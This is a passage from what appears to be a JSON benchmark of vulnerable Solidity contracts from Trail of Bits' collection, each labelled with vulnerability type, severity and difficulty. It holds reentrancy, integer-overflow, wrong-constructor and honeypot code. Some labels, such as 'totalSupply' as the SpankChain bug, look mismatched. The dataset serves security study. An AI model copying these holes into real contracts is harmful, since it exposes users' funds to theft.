        updateParams[5]\n            )\n        );\n\n        require(channel.partyAddresses[0] == ECTools.recoverSigner(_state, _sigA));\n        require(channel.partyAddresses[1] == ECTools.recoverSigner(_state, _sigI));\n\n        // update LC state\n        channel.sequence = updateParams[0];\n        channel.numOpenVC = updateParams[1];\n        channel.ethBalances[0] = updateParams[2];\n        channel.ethBalances[1] = updateParams[3];\n        channel.erc20Balances[0] = updateParams[4];\n        channel.erc20Balances[1] = updateParams[5];\n        channel.VCrootHash = _VCroot;\n        channel.isUpdateLCSettling = true;\n        channel.updateLCtimeout = now + channel.confirmTime;\n\n        // make settlement flag\n\n        emit DidLCUpdateState (\n            _lcID, \n            updateParams[0], \n            updateParams[1], \n            updateParams[2], \n            updateParams[3],\n            updateParams[4],\n            updateParams[5], \n            _VCroot,\n            channel.updateLCtimeout\n        );\n    }\n\n    // supply initial state of VC to \"prime\" the force push game  \n    function initVCstate(\n        bytes32 _lcID, \n        bytes32 _vcID, \n        bytes _proof, \n        address _partyA, \n        address _partyB, \n        uint256[2] _bond,\n        uint256[4] _balances, // 0: ethBalanceA 1:ethBalanceI 2:tokenBalanceA 3:tokenBalanceI\n        string sigA\n    ) \n        public \n    {\n        require(Channels[_lcID].isOpen, \"LC is closed.\");\n        // sub-channel must be open\n        require(!virtualChannels[_vcID].isClose, \"VC is closed.\");\n        // Check time has passed on updateLCtimeout and has not passed the time to store a vc state\n        require(Channels[_lcID].updateLCtimeout < now, \"LC timeout not over.\");\n        // prevent rentry of initializing vc state\n        require(virtualChannels[_vcID].updateVCtimeout == 0);\n        // partyB is now Ingrid\n        bytes32 _initState = keccak256(\n            abi.encodePacked(_vcID, uint256(0), _partyA, _partyB, _bond[0], _bond[1], _balances[0], _balances[1], _balances[2], _balances[3])\n        );\n\n        // Make sure Alice has signed initial vc state (A/B in oldState)\n        require(_partyA == ECTools.recoverSigner(_initState, sigA));\n\n        // Check the oldState is in the root hash\n        require(_isContained(_initState, _proof, Channels[_lcID].VCrootHash) == true);\n\n        virtualChannels[_vcID].partyA = _partyA; // VC participant A\n        virtualChannels[_vcID].partyB = _partyB; // VC participant B\n        virtualChannels[_vcID].sequence = uint256(0);\n        virtualChannels[_vcID].ethBalances[0] = _balances[0];\n        virtualChannels[_vcID].ethBalances[1] = _balances[1];\n        virtualChannels[_vcID].erc20Balances[0] = _balances[2];\n        virtualChannels[_vcID].erc20Balances[1] = _balances[3];\n        virtualChannels[_vcID].bond = _bond;\n        virtualChannels[_vcID].updateVCtimeout = now + Channels[_lcID].confirmTime;\n        virtualChannels[_vcID].isInSettlementState = true;\n\n        emit DidVCInit(_lcID, _vcID, _proof, uint256(0), _partyA, _partyB, _balances[0], _balances[1]);\n    }\n\n    //TODO: verify state transition since the hub did not agree to this state\n    // make sure the A/B balances are not beyond ingrids bonds  \n    // Params: vc init state, vc final balance, vcID\n    function settleVC(\n        bytes32 _lcID, \n        bytes32 _vcID, \n        uint256 updateSeq, \n        address _partyA, \n        address _partyB,\n        uint256[4] updateBal, // [ethupdateBalA, ethupdateBalB, tokenupdateBalA, tokenupdateBalB]\n        string sigA\n    ) \n        public \n    {\n        require(Channels[_lcID].isOpen, \"LC is closed.\");\n        // sub-channel must be open\n        require(!virtualChannels[_vcID].isClose, \"VC is closed.\");\n        require(virtualChannels[_vcID].sequence < updateSeq, \"VC sequence is higher than update sequence.\");\n        require(\n            virtualChannels[_vcID].ethBalances[1] < updateBal[1] && virtualChannels[_vcID].erc20Balances[1] < updateBal[3],\n            \"State updates may only increase recipient balance.\"\n        );\n        require(\n            virtualChannels[_vcID].bond[0] == updateBal[0] + updateBal[1] &&\n            virtualChannels[_vcID].bond[1] == updateBal[2] + updateBal[3], \n            \"Incorrect balances for bonded amount\");\n        // Check time has passed on updateLCtimeout and has not passed the time to store a vc state\n        // virtualChannels[_vcID].updateVCtimeout should be 0 on uninitialized vc state, and this should\n        // fail if initVC() isn't called first\n        // require(Channels[_lcID].updateLCtimeout < now && now < virtualChannels[_vcID].updateVCtimeout);\n        require(Channels[_lcID].updateLCtimeout < now); // for testing!\n\n        bytes32 _updateState = keccak256(\n            abi.encodePacked(\n                _vcID, \n                updateSeq, \n                _partyA, \n                _partyB, \n                virtualChannels[_vcID].bond[0], \n                virtualChannels[_vcID].bond[1], \n                updateBal[0], \n                updateBal[1], \n                updateBal[2], \n                updateBal[3]\n            )\n        );\n\n        // Make sure Alice has signed a higher sequence new state\n        require(virtualChannels[_vcID].partyA == ECTools.recoverSigner(_updateState, sigA));\n\n        // store VC data\n        // we may want to record who is initiating on-chain settles\n        virtualChannels[_vcID].challenger = msg.sender;\n        virtualChannels[_vcID].sequence = updateSeq;\n\n        // channel state\n        virtualChannels[_vcID].ethBalances[0] = updateBal[0];\n        virtualChannels[_vcID].ethBalances[1] = updateBal[1];\n        virtualChannels[_vcID].erc20Balances[0] = updateBal[2];\n        virtualChannels[_vcID].erc20Balances[1] = updateBal[3];\n\n        virtualChannels[_vcID].updateVCtimeout = now + Channels[_lcID].confirmTime;\n\n        emit DidVCSettle(_lcID, _vcID, updateSeq, updateBal[0], updateBal[1], msg.sender, virtualChannels[_vcID].updateVCtimeout);\n    }\n\n    function closeVirtualChannel(bytes32 _lcID, bytes32 _vcID) public {\n        // require(updateLCtimeout > now)\n        require(Channels[_lcID].isOpen, \"LC is closed.\");\n        require(virtualChannels[_vcID].isInSettlementState, \"VC is not in settlement state.\");\n        require(virtualChannels[_vcID].updateVCtimeout < now, \"Update vc timeout has not elapsed.\");\n        require(!virtualChannels[_vcID].isClose, \"VC is already closed\");\n        // reduce the number of open virtual channels stored on LC\n        Channels[_lcID].numOpenVC--;\n        // close vc flags\n        virtualChannels[_vcID].isClose = true;\n        // re-introduce the balances back into the LC state from the settled VC\n        // decide if this lc is alice or bob in the vc\n        if(virtualChannels[_vcID].partyA == Channels[_lcID].partyAddresses[0]) {\n            Channels[_lcID].ethBalances[0] += virtualChannels[_vcID].ethBalances[0];\n            Channels[_lcID].ethBalances[1] += virtualChannels[_vcID].ethBalances[1];\n\n            Channels[_lcID].erc20Balances[0] += virtualChannels[_vcID].erc20Balances[0];\n            Channels[_lcID].erc20Balances[1] += virtualChannels[_vcID].erc20Balances[1];\n        } else if (virtualChannels[_vcID].partyB == Channels[_lcID].partyAddresses[0]) {\n            Channels[_lcID].ethBalances[0] += virtualChannels[_vcID].ethBalances[1];\n            Channels[_lcID].ethBalances[1] += virtualChannels[_vcID].ethBalances[0];\n\n            Channels[_lcID].erc20Balances[0] += virtualChannels[_vcID].erc20Balances[1];\n            Channels[_lcID].erc20Balances[1] += virtualChannels[_vcID].erc20Balances[0];\n        }\n\n        emit DidVCClose(_lcID, _vcID, virtualChannels[_vcID].erc20Balances[0], virtualChannels[_vcID].erc20Balances[1]);\n    }\n\n\n    // todo: allow ethier lc.end-user to nullify the settled LC state and return to off-chain\n    function byzantineCloseChannel(bytes32 _lcID) public {\n        Channel storage channel = Channels[_lcID];\n\n        // check settlement flag\n        require(channel.isOpen, \"Channel is not open\");\n        require(channel.isUpdateLCSettling == true);\n        require(channel.numOpenVC == 0);\n        require(channel.updateLCtimeout < now, \"LC timeout over.\");\n\n        // if off chain state update didnt reblance deposits, just return to deposit owner\n        uint256 totalEthDeposit = channel.initialDeposit[0] + channel.ethBalances[2] + channel.ethBalances[3];\n        uint256 totalTokenDeposit = channel.initialDeposit[1] + channel.erc20Balances[2] + channel.erc20Balances[3];\n\n        uint256 possibleTotalEthBeforeDeposit = channel.ethBalances[0] + channel.ethBalances[1]; \n        uint256 possibleTotalTokenBeforeDeposit = channel.erc20Balances[0] + channel.erc20Balances[1];\n\n        if(possibleTotalEthBeforeDeposit < totalEthDeposit) {\n            channel.ethBalances[0]+=channel.ethBalances[2];\n            channel.ethBalances[1]+=channel.ethBalances[3];\n        } else {\n            require(possibleTotalEthBeforeDeposit == totalEthDeposit);\n        }\n\n        if(possibleTotalTokenBeforeDeposit < totalTokenDeposit) {\n            channel.erc20Balances[0]+=channel.erc20Balances[2];\n            channel.erc20Balances[1]+=channel.erc20Balances[3];\n        } else {\n            require(possibleTotalTokenBeforeDeposit == totalTokenDeposit);\n        }\n\n        // reentrancy\n        uint256 ethbalanceA = channel.ethBalances[0];\n        uint256 ethbalanceI = channel.ethBalances[1];\n        uint256 tokenbalanceA = channel.erc20Balances[0];\n        uint256 tokenbalanceI = channel.erc20Balances[1];\n\n        channel.ethBalances[0] = 0;\n        channel.ethBalances[1] = 0;\n        channel.erc20Balances[0] = 0;\n        channel.erc20Balances[1] = 0;\n\n        if(ethbalanceA != 0 || ethbalanceI != 0) {\n            channel.partyAddresses[0].transfer(ethbalanceA);\n            channel.partyAddresses[1].transfer(ethbalanceI);\n        }\n\n        if(tokenbalanceA != 0 || tokenbalanceI != 0) {\n            require(\n                channel.token.transfer(channel.partyAddresses[0], tokenbalanceA),\n                \"byzantineCloseChannel: token transfer failure\"\n            );\n            require(\n                channel.token.transfer(channel.partyAddresses[1], tokenbalanceI),\n                \"byzantineCloseChannel: token transfer failure\"\n            );          \n        }\n\n        channel.isOpen = false;\n        numChannels--;\n\n        emit DidLCClose(_lcID, channel.sequence, ethbalanceA, ethbalanceI, tokenbalanceA, tokenbalanceI);\n    }\n\n    function _isContained(bytes32 _hash, bytes _proof, bytes32 _root) internal pure returns (bool) {\n        bytes32 cursor = _hash;\n        bytes32 proofElem;\n\n        for (uint256 i = 64; i <= _proof.length; i += 32) {\n            assembly { proofElem := mload(add(_proof, i)) }\n\n            if (cursor < proofElem) {\n                cursor = keccak256(abi.encodePacked(cursor, proofElem));\n            } else {\n                cursor = keccak256(abi.encodePacked(proofElem, cursor));\n            }\n        }\n\n        return cursor == _root;\n    }\n\n    //Struct Getters\n    function getChannel(bytes32 id) public view returns (\n        address[2],\n        uint256[4],\n        uint256[4],\n        uint256[2],\n        uint256,\n        uint256,\n        bytes32,\n        uint256,\n        uint256,\n        bool,\n        bool,\n        uint256\n    ) {\n        Channel memory channel = Channels[id];\n        return (\n            channel.partyAddresses,\n            channel.ethBalances,\n            channel.erc20Balances,\n            channel.initialDeposit,\n            channel.sequence,\n            channel.confirmTime,\n            channel.VCrootHash,\n            channel.LCopenTimeout,\n            channel.updateLCtimeout,\n            channel.isOpen,\n            channel.isUpdateLCSettling,\n            channel.numOpenVC\n        );\n    }\n\n    function getVirtualChannel(bytes32 id) public view returns(\n        bool,\n        bool,\n        uint256,\n        address,\n        uint256,\n        address,\n        address,\n        address,\n        uint256[2],\n        uint256[2],\n        uint256[2]\n    ) {\n        VirtualChannel memory virtualChannel = virtualChannels[id];\n        return(\n            virtualChannel.isClose,\n            virtualChannel.isInSettlementState,\n            virtualChannel.sequence,\n            virtualChannel.challenger,\n            virtualChannel.updateVCtimeout,\n            virtualChannel.partyA,\n            virtualChannel.partyB,\n            virtualChannel.partyI,\n            virtualChannel.ethBalances,\n            virtualChannel.erc20Balances,\n            virtualChannel.bond\n        );\n    }\n}\n",
    "vulnerable_function": "totalSupply",
    "vulnerable_lines": [],
    "vulnerability_type": "reentrancy",
    "category": "reentrancy",
    "severity": "high",
    "difficulty_tier": 2,
    "description": "# Re-entrancy\nA state variable is changed after a contract uses `call.value`. The attacker uses\n[a fallback function](ReentrancyExploit.sol#L26-L33)\u2014which is automatically executed after\nEther is transferred from the targeted contract\u2014to execute the vulnerable function again, *before* the\nstate variable is changed.",
    "fix_description": "",
    "references": [
      "http://hackingdistributed.com/2016/06/18/analysis-of-the-dao-exploit/",
      "https://medium.com/spankchain/we-got-spanked-what-we-know-so-far-d5ed3a0f38fe"
    ],
    "is_vulnerable": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "reentrancy/SpankChain_source_code/SpankChain_Payment.sol",
    "pragma": "^0.4.23",
    "source": "Trail of Bits"
  },
  {
    "id": "notso_reentrancy_spankchain",
    "source_dataset": "not-so-smart-contracts",
    "language": "solidity",
    "chain": "evm",
    "file_name": "SpankChain.sol",
    "file_content": "// https://etherscan.io/address/0x42d6622dece394b54999fbd73d108123806f6a18#code\n\n// Abstract contract for the full ERC 20 Token standard\n// https://github.com/ethereum/EIPs/issues/20\npragma solidity 0.4.15;\n\ncontract Token {\n    /* This is a slight change to the ERC20 base standard.\n    function totalSupply() constant returns (uint256 supply);\n    is replaced with:\n    uint256 public totalSupply;\n    This automatically creates a getter function for the totalSupply.\n    This is moved to the base contract since public getter functions are not\n    currently recognised as an implementation of the matching abstract\n    function by the compiler.\n    */\n    /// total amount of tokens\n    uint256 public totalSupply;\n\n    /// @param _owner The address from which the balance will be retrieved\n    /// @return The balance\n    function balanceOf(address _owner) constant returns (uint256 balance);\n\n    /// @notice send `_value` token to `_to` from `msg.sender`\n    /// @param _to The address of the recipient\n    /// @param _value The amount of token to be transferred\n    /// @return Whether the transfer was successful or not\n    function transfer(address _to, uint256 _value) returns (bool success);\n\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n    /// @param _from The address of the sender\n    /// @param _to The address of the recipient\n    /// @param _value The amount of token to be transferred\n    /// @return Whether the transfer was successful or not\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n\n    /// @notice `msg.sender` approves `_spender` to spend `_value` tokens\n    /// @param _spender The address of the account able to transfer the tokens\n    /// @param _value The amount of tokens to be approved for transfer\n    /// @return Whether the approval was successful or not\n    function approve(address _spender, uint256 _value) returns (bool success);\n\n    /// @param _owner The address of the account owning tokens\n    /// @param _spender The address of the account able to transfer the tokens\n    /// @return Amount of remaining tokens allowed to spent\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\n\n/*\nYou should inherit from StandardToken or, for a token like you would want to\ndeploy in something like Mist, see HumanStandardToken.sol.\n(This implements ONLY the standard functions and NOTHING else.\nIf you deploy this, you won't have anything useful.)\n\nImplements ERC 20 Token standard: https://github.com/ethereum/EIPs/issues/20\n.*/\ncontract StandardToken is Token {\n\n    function transfer(address _to, uint256 _value) returns (bool success) {\n        //Default assumes totalSupply can't be over max (2^256 - 1).\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n        //Replace the if with this one instead.\n        //require(balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]);\n        require(balances[msg.sender] >= _value);\n        balances[msg.sender] -= _value;\n        balances[_to] += _value;\n        Transfer(msg.sender, _to, _value);\n        return true;\n    }\n\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\n        //require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]);\n        require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\n        balances[_to] += _value;\n        balances[_from] -= _value;\n        allowed[_from][msg.sender] -= _value;\n        Transfer(_from, _to, _value);\n        return true;\n    }\n\n    function balanceOf(address _owner) constant returns (uint256 balance) {\n        return balances[_owner];\n    }\n\n    function approve(address _spender, uint256 _value) returns (bool success) {\n        allowed[msg.sender][_spender] = _value;\n        Approval(msg.sender, _spender, _value);\n        return true;\n    }\n\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n      return allowed[_owner][_spender];\n    }\n\n    mapping (address => uint256) balances;\n    mapping (address => mapping (address => uint256)) allowed;\n}\n\n/*\nThis Token Contract implements the standard token functionality (https://github.com/ethereum/EIPs/issues/20) as well as the following OPTIONAL extras intended for use by humans.\n\nIn other words. This is intended for deployment in something like a Token Factory or Mist wallet, and then used by humans.\nImagine coins, currencies, shares, voting weight, etc.\nMachine-based, rapid creation of many tokens would not necessarily need these extra features or will be minted in other manners.\n\n1) Initial Finite Supply (upon creation one specifies how much is minted).\n2) In the absence of a token registry: Optional Decimal, Symbol & Name.\n3) Optional approveAndCall() functionality to notify a contract if an approval() has occurred.\n\n.*/\ncontract HumanStandardToken is StandardToken {\n\n    /* Public variables of the token */\n\n    /*\n    NOTE:\n    The following variables are OPTIONAL vanities. One does not have to include them.\n    They allow one to customise the token contract & in no way influences the core functionality.\n    Some wallets/interfaces might not even bother to look at this information.\n    */\n    string public name;                   //fancy name: eg Simon Bucks\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n    string public symbol;                 //An identifier: eg SBX\n    string public version = 'H0.1';       //human 0.1 standard. Just an arbitrary versioning scheme.\n\n    function HumanStandardToken(\n        uint256 _initialAmount,\n        string _tokenName,\n        uint8 _decimalUnits,\n        string _tokenSymbol\n        ) {\n        balances[msg.sender] = _initialAmount;               // Give the creator all initial tokens\n        totalSupply = _initialAmount;                        // Update total supply\n        name = _tokenName;                                   // Set the name for display purposes\n        decimals = _decimalUnits;                            // Amount of decimals for display purposes\n        symbol = _tokenSymbol;                               // Set the symbol for display purposes\n    }\n\n    /* Approves and then calls the receiving contract */\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n        allowed[msg.sender][_spender] = _value;\n        Approval(msg.sender, _spender, _value);\n\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n        require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n        return true;\n    }\n}\n",
    "vulnerable_function": "totalSupply",
    "vulnerable_lines": [],
    "vulnerability_type": "reentrancy",
    "category": "reentrancy",
    "severity": "high",
    "difficulty_tier": 2,
    "description": "# Re-entrancy\nA state variable is changed after a contract uses `call.value`. The attacker uses\n[a fallback function](ReentrancyExploit.sol#L26-L33)\u2014which is automatically executed after\nEther is transferred from the targeted contract\u2014to execute the vulnerable function again, *before* the\nstate variable is changed.",
    "fix_description": "",
    "references": [
      "http://hackingdistributed.com/2016/06/18/analysis-of-the-dao-exploit/",
      "https://medium.com/spankchain/we-got-spanked-what-we-know-so-far-d5ed3a0f38fe"
    ],
    "is_vulnerable": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "reentrancy/SpankChain_source_code/SpankChain.sol",
    "pragma": "0.4.15",
    "source": "Trail of Bits"
  },
  {
    "id": "notso_integer_overflow_integer_overflow_1",
    "source_dataset": "not-so-smart-contracts",
    "language": "solidity",
    "chain": "evm",
    "file_name": "integer_overflow_1.sol",
    "file_content": "pragma solidity ^0.4.15;\n\ncontract Overflow {\n    uint private sellerBalance=0;\n    \n    function add(uint value) returns (bool){\n        sellerBalance += value; // possible overflow\n\n        // possible auditor assert\n        // assert(sellerBalance >= value); \n    } \n\n    function safe_add(uint value) returns (bool){\n        require(value + sellerBalance >= sellerBalance);\n        sellerBalance += value; \n    } \n}\n",
    "vulnerable_function": "add",
    "vulnerable_lines": [],
    "vulnerability_type": "integer_issues",
    "category": "integer_overflow",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "# Integer Overflow",
    "fix_description": "",
    "references": [
      "https://github.com/OpenZeppelin/openzeppelin-solidity/blob/master/contracts/math/SafeMath.sol",
      "https://github.com/Arachnid/uscc/tree/master/submissions-2017/doughoyte"
    ],
    "is_vulnerable": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "integer_overflow/integer_overflow_1.sol",
    "pragma": "^0.4.15",
    "source": "Trail of Bits"
  },
  {
    "id": "notso_wrong_constructor_name_incorrect_constructor",
    "source_dataset": "not-so-smart-contracts",
    "language": "solidity",
    "chain": "evm",
    "file_name": "incorrect_constructor.sol",
    "file_content": "pragma solidity ^0.4.15;\n\ncontract Missing{\n    address private owner;\n\n    modifier onlyowner {\n        require(msg.sender==owner);\n        _;\n    }\n\n    // The name of the constructor should be Missing\n    // Anyone can call the IamMissing once the contract is deployed\n    function IamMissing()\n        public \n    {\n        owner = msg.sender;\n    }\n\n    function withdraw() \n        public \n        onlyowner\n    {\n       owner.transfer(this.balance);\n    }\n}\n",
    "vulnerable_function": "IamMissing",
    "vulnerable_lines": [],
    "vulnerability_type": "access_control",
    "category": "wrong_constructor_name",
    "severity": "high",
    "difficulty_tier": 2,
    "description": "# Wrong Constructor Name",
    "fix_description": "",
    "references": [],
    "is_vulnerable": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "wrong_constructor_name/incorrect_constructor.sol",
    "pragma": "^0.4.15",
    "source": "Trail of Bits"
  },
  {
    "id": "notso_wrong_constructor_name_rubixi",
    "source_dataset": "not-so-smart-contracts",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Rubixi.sol",
    "file_content": "// 0xe82719202e5965Cf5D9B6673B7503a3b92DE20be#code\npragma solidity ^0.4.15;\n\ncontract Rubixi {\n\n        //Declare variables for storage critical to contract\n        uint private balance = 0;\n        uint private collectedFees = 0;\n        uint private feePercent = 10;\n        uint private pyramidMultiplier = 300;\n        uint private payoutOrder = 0;\n\n        address private creator;\n\n        //Sets creator\n        function DynamicPyramid() {\n                creator = msg.sender;\n        }\n\n        modifier onlyowner {\n                if (msg.sender == creator) _;\n        }\n\n        struct Participant {\n                address etherAddress;\n                uint payout;\n        }\n\n        Participant[] private participants;\n\n        //Fallback function\n        function() {\n                init();\n        }\n\n        //init function run on fallback\n        function init() private {\n                //Ensures only tx with value of 1 ether or greater are processed and added to pyramid\n                if (msg.value < 1 ether) {\n                        collectedFees += msg.value;\n                        return;\n                }\n\n                uint _fee = feePercent;\n                //50% fee rebate on any ether value of 50 or greater\n                if (msg.value >= 50 ether) _fee /= 2;\n\n                addPayout(_fee);\n        }\n\n        //Function called for valid tx to the contract\n        function addPayout(uint _fee) private {\n                //Adds new address to participant array\n                participants.push(Participant(msg.sender, (msg.value * pyramidMultiplier) / 100));\n\n                //These statements ensure a quicker payout system to later pyramid entrants, so the pyramid has a longer lifespan\n                if (participants.length == 10) pyramidMultiplier = 200;\n                else if (participants.length == 25) pyramidMultiplier = 150;\n\n                // collect fees and update contract balance\n                balance += (msg.value * (100 - _fee)) / 100;\n                collectedFees += (msg.value * _fee) / 100;\n\n                //Pays earlier participiants if balance sufficient\n                while (balance > participants[payoutOrder].payout) {\n                        uint payoutToSend = participants[payoutOrder].payout;\n                        participants[payoutOrder].etherAddress.send(payoutToSend);\n\n                        balance -= participants[payoutOrder].payout;\n                        payoutOrder += 1;\n                }\n        }\n\n        //Fee functions for creator\n        function collectAllFees() onlyowner {\n                if (collectedFees == 0) throw;\n\n                creator.send(collectedFees);\n                collectedFees = 0;\n        }\n\n        function collectFeesInEther(uint _amt) onlyowner {\n                _amt *= 1 ether;\n                if (_amt > collectedFees) collectAllFees();\n\n                if (collectedFees == 0) throw;\n\n                creator.send(_amt);\n                collectedFees -= _amt;\n        }\n\n        function collectPercentOfFees(uint _pcent) onlyowner {\n                if (collectedFees == 0 || _pcent > 100) throw;\n\n                uint feesToCollect = collectedFees / 100 * _pcent;\n                creator.send(feesToCollect);\n                collectedFees -= feesToCollect;\n        }\n\n        //Functions for changing variables related to the contract\n        function changeOwner(address _owner) onlyowner {\n                creator = _owner;\n        }\n\n        function changeMultiplier(uint _mult) onlyowner {\n                if (_mult > 300 || _mult < 120) throw;\n\n                pyramidMultiplier = _mult;\n        }\n\n        function changeFeePercentage(uint _fee) onlyowner {\n                if (_fee > 10) throw;\n\n                feePercent = _fee;\n        }\n\n        //Functions to provide information to end-user using JSON interface or other interfaces\n        function currentMultiplier() constant returns(uint multiplier, string info) {\n                multiplier = pyramidMultiplier;\n                info = 'This multiplier applies to you as soon as transaction is received, may be lowered to hasten payouts or increased if payouts are fast enough. Due to no float or decimals, multiplier is x100 for a fractional multiplier e.g. 250 is actually a 2.5x multiplier. Capped at 3x max and 1.2x min.';\n        }\n\n        function currentFeePercentage() constant returns(uint fee, string info) {\n                fee = feePercent;\n                info = 'Shown in % form. Fee is halved(50%) for amounts equal or greater than 50 ethers. (Fee may change, but is capped to a maximum of 10%)';\n        }\n\n        function currentPyramidBalanceApproximately() constant returns(uint pyramidBalance, string info) {\n                pyramidBalance = balance / 1 ether;\n                info = 'All balance values are measured in Ethers, note that due to no decimal placing, these values show up as integers only, within the contract itself you will get the exact decimal value you are supposed to';\n        }\n\n        function nextPayoutWhenPyramidBalanceTotalsApproximately() constant returns(uint balancePayout) {\n                balancePayout = participants[payoutOrder].payout / 1 ether;\n        }\n\n        function feesSeperateFromBalanceApproximately() constant returns(uint fees) {\n                fees = collectedFees / 1 ether;\n        }\n\n        function totalParticipants() constant returns(uint count) {\n                count = participants.length;\n        }\n\n        function numberOfParticipantsWaitingForPayout() constant returns(uint count) {\n                count = participants.length - payoutOrder;\n        }\n\n        function participantDetails(uint orderInPyramid) constant returns(address Address, uint Payout) {\n                if (orderInPyramid <= participants.length) {\n                        Address = participants[orderInPyramid].etherAddress;\n                        Payout = participants[orderInPyramid].payout / 1 ether;\n                }\n        }\n}\n",
    "vulnerable_function": "DynamicPyramid",
    "vulnerable_lines": [],
    "vulnerability_type": "access_control",
    "category": "wrong_constructor_name",
    "severity": "high",
    "difficulty_tier": 2,
    "description": "# Wrong Constructor Name",
    "fix_description": "",
    "references": [],
    "is_vulnerable": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "wrong_constructor_name/Rubixi_source_code/Rubixi.sol",
    "pragma": "^0.4.15",
    "source": "Trail of Bits"
  },
  {
    "id": "notso_honeypots_privatebank",
    "source_dataset": "not-so-smart-contracts",
    "language": "solidity",
    "chain": "evm",
    "file_name": "PrivateBank.sol",
    "file_content": "pragma solidity ^0.4.19;\n\ncontract Private_Bank\n{\n    mapping (address => uint) public balances;\n    \n    uint public MinDeposit = 1 ether;\n    \n    Log TransferLog;\n    \n    function Private_Bank(address _log)\n    {\n        TransferLog = Log(_log);\n    }\n    \n    function Deposit()\n    public\n    payable\n    {\n        if(msg.value >= MinDeposit)\n        {\n            balances[msg.sender]+=msg.value;\n            TransferLog.AddMessage(msg.sender,msg.value,\"Deposit\");\n        }\n    }\n    \n    function CashOut(uint _am)\n    {\n        if(_am<=balances[msg.sender])\n        {\n            \n            if(msg.sender.call.value(_am)())\n            {\n                balances[msg.sender]-=_am;\n                TransferLog.AddMessage(msg.sender,_am,\"CashOut\");\n            }\n        }\n    }\n    \n    function() public payable{}    \n    \n}\n\ncontract Log \n{\n   \n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n    \n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}\n",
    "vulnerable_function": "Private_Bank",
    "vulnerable_lines": [],
    "vulnerability_type": "honeypot",
    "category": "honeypots",
    "severity": "low",
    "difficulty_tier": 3,
    "description": "# Honeypot Collection",
    "fix_description": "",
    "references": [
      "https://github.com/trailofbits/not-so-smart-contracts/tree/master/variable%20shadowing",
      "https://github.com/trailofbits/manticore",
      "https://github.com/trailofbits/not-so-smart-contracts/tree/master/reentrancy"
    ],
    "is_vulnerable": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "honeypots/PrivateBank/PrivateBank.sol",
    "pragma": "^0.4.19",
    "source": "Trail of Bits"
  },
  {
    "id": "notso_honeypots_multiplicator",
    "source_dataset": "not-so-smart-contracts",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Multiplicator.sol",
    "file_content": "pragma solidity ^0.4.18;\n\ncontract Multiplicator\n{\n    address public Owner = msg.sender;\n   \n    function()payable{}\n   \n    function withdraw()\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n    \n    function multiplicate(address adr)\n    payable\n    {\n        if(msg.value>=this.balance)\n        {        \n            adr.transfer(this.balance+msg.value);\n        }\n    }\n}\n\n",
    "vulnerable_function": "withdraw",
    "vulnerable_lines": [],
    "vulnerability_type": "honeypot",
    "category": "honeypots",
    "severity": "low",
    "difficulty_tier": 3,
    "description": "# Honeypot Collection",
    "fix_description": "",
    "references": [
      "https://github.com/trailofbits/not-so-smart-contracts/tree/master/variable%20shadowing",
      "https://github.com/trailofbits/manticore",
      "https://github.com/trailofbits/not-so-smart-contracts/tree/master/reentrancy"
    ],
    "is_vulnerable": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "honeypots/Multiplicator/Multiplicator.sol",
    "pragma": "^0.4.18",
    "source": "Trail of Bits"
  },
  {
    "id": "notso_honeypots_koth",
    "source_dataset": "not-so-smart-contracts",
    "language": "solidity",
    "chain": "evm",
    "file_name": "KOTH.sol",
    "file_content": "pragma solidity ^0.4.19;\n//\n//Live TEST ---- Please Do NOT use! Thanks! ----\n//\ncontract Ownable {\n    address public owner;\n    function Ownable() public {owner = msg.sender;}\n    modifier onlyOwner() {require(msg.sender == owner); _;\n    }\n}\n//CEO Throne .. The CEO with the highest stake gets the control over the contract\n//msg.value needs to be higher than largestStake when calling Stake()\n\ncontract CEOThrone is Ownable {\n    address public owner;\n    uint public largestStake;\n// Stake() function being called with 0xde20bc92 and ETH :: recommended gas limit 35.000\n// The sent ETH is checked against largestStake\n    function Stake() public payable {\n        // if you own the largest stake in a company, you own a company\n        if (msg.value > largestStake) {\n            owner = msg.sender;\n            largestStake = msg.value;\n        }\n    }\n// withdraw() function being called with 0x3ccfd60b :: recommened gas limit 30.000\n    function withdraw() public onlyOwner {\n        // only owner can withdraw funds\n        msg.sender.transfer(this.balance);\n    }\n}\n",
    "vulnerable_function": "Ownable",
